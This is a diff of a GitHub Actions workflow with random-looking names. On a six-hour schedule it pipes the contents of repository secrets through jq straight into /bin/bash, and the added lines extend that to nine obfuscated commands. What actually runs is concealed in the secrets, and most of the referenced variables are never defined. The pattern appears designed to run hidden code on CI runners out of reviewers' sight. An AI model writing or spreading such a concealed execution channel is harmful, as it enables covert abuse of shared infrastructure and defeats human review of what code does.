@@ -2,8 +2,9 @@ name: zengkaimen3819
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 1/6 * * *'
-jobs:  # 14269
+    - cron: '45 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,12 +12,15 @@ jobs:  # 14269
       - uses: actions/checkout@v4
       - name: zengkaimen3819
         env:
-          qgmir088: ${{ secrets.qgmir088 }}
+          cfj79995: ${{ secrets.cfj79995 }}
         run: |
-          echo $qgmir088 | jq -r .hm45 | /bin/bash
-          echo $cv4968 | jq -r .h0508 | /bin/bash
-          echo $uxjk04 | jq -r .mex5 | /bin/bash
-          echo $ksno09024 | jq -r .ww5 | /bin/bash
-          echo $tzc66825 | jq -r .upnjl50 | /bin/bash
-          echo $etiam9449 | jq -r .o3083 | /bin/bash
+          echo $cfj79995 | jq -r .huz50 | /bin/bash
+          echo $o32 | jq -r .c802 | /bin/bash
+          echo $krrbg4957 | jq -r .uy18 | /bin/bash
+          echo $y911 | jq -r .ue12 | /bin/bash
+          echo $n2376 | jq -r .y0740 | /bin/bash
+          echo $k41820 | jq -r .nkwfx59 | /bin/bash
+          echo $cmzn22 | jq -r .frpui21933 | /bin/bash
+          echo $otkcp0793 | jq -r .zba6804 | /bin/bash
+          echo $cnd037 | jq -r .tmts182 | /bin/bash
 
